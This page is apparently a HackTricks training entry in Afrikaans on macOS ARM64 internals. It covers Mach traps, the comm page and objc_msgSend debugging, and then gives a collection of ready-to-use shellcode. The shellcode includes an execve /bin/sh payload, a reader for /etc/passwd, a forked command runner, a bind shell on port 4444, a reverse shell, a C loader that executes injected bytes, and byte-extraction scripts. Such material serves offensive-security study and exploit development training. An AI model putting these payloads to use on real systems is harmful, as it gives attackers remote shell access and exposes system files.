### Mach Traps

Kyk in [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) na die `mach_trap_table` en in [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) na die prototipes. Die maksimum aantal Mach traps is `MACH_TRAP_TABLE_COUNT` = 128. Mach traps sal **x16 < 0** hê, so jy moet die nommers van die vorige lys met 'n **minus** aanroep: **`_kernelrpc_mach_vm_allocate_trap`** is **`-10`**.

Jy kan ook **`libsystem_kernel.dylib`** in 'n disassembler nagaan om te vind hoe om hierdie (en BSD) syscalls te roep:
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
Noteer dat **Ida** en **Ghidra** ook **decompiled** kan kyk van **specific dylibs** uit die cache net deur die cache deur te gee.

> [!TIP]
> Soms is dit makliker om die **decompiled** code van **`libsystem_kernel.dylib`** te ondersoek **as** om die **source code** na te gaan, omdat die code van verskeie syscalls (BSD and Mach) gegenereer word via scripts ( kyk kommentaar in die source code ) terwyl jy in die dylib kan vind wat aangeroep word.

### machdep-aanroepe

XNU ondersteun nog ’n tipe aanroepe wat machine dependent genoem word. Die nommers van hierdie aanroepe hang af van die argitektuur en beide die aanroepe en nommers word nie gewaarborg om konstant te bly nie.

### comm page

Dit is ’n kernel-eienaarskap geheugenblad wat in die address space van elke gebruiker se proses geplaas word. Dit is bedoel om die oorgang van user mode na kernel space vinniger te maak as om syscalls te gebruik vir kern-dienste wat so gereeld gebruik word dat hierdie oorgang baie ondoeltreffend sou wees.

Byvoorbeeld die oproep `gettimeofdate` lees die waarde van `timeval` direk vanaf die comm page.

### objc_msgSend

Dit is baie algemeen om hierdie funksie in Objective-C of Swift programme te vind. Hierdie funksie maak dit moontlik om ’n method van ’n Objective-C object aan te roep.

Parameterse ( [more info in the docs](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend) ):

- x0: self -> aanwyser na die instansie
- x1: op -> selector van die metode
- x2... -> die res van die argumente van die aangeroepde metode

Dus, as jy ’n breakpoint sit voor die branch na hierdie funksie, kan jy maklik vind wat aangeroep word in lldb met (in hierdie voorbeeld roep die objek ’n objek van `NSConcreteTask` aan wat ’n command sal uitvoer):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> Deur die omgewingsveranderlike **`NSObjCMessageLoggingEnabled=1`** te stel, is dit moontlik om te log wanneer hierdie funksie aangeroep word in 'n lêer soos `/tmp/msgSends-pid`.
>
> Boonop, deur **`OBJC_HELP=1`** te stel en enige binary aan te roep, kan jy ander omgewingsveranderlikes sien wat jy kan gebruik om te **log** wanneer sekere Objc-C-aksies plaasvind.

Wanneer hierdie funksie aangeroep word, moet die aangeroepe metode van die aangeduide instansie gevind word; hiervoor word verskeie soektogte uitgevoer:

- Voer optimistiese cache-opsoek uit:
- As dit suksesvol is, klaar
- Verkry runtimeLock (read)
- Indien (realize && !cls->realized) realize class
- Indien (initialize && !cls->initialized) initialize class
- Probeer die klas se eie cache:
- As dit suksesvol is, klaar
- Probeer klas se method list:
- Indien gevind, vul cache en klaar
- Probeer superclass cache:
- As dit suksesvol is, klaar
- Probeer superclass method list:
- Indien gevind, vul cache en klaar
- Indien (resolver) probeer method resolver, en herhaal vanaf class lookup
- Indien steeds hier (= alles anders het misluk) probeer forwarder

### Shellcodes

Om te kompileer:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Om die bytes te onttrek:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
Vir nuwer macOS:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>C-kode om die shellcode te toets</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Geneem van [**here**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) en verduidelik.

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="with adr for linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### Lees met cat

Die doel is om `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` uit te voer, dus die tweede argument (x1) is 'n array van params (wat in geheue beteken dit is 'n stack van adresse).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Voer opdrag met sh uit vanaf 'n fork sodat die hoofproses nie gedood word nie
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell van [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) op **port 4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Omgekeerde shell

Vanaf [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell na **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
{{#include ../../../banners/hacktricks-training.md}}
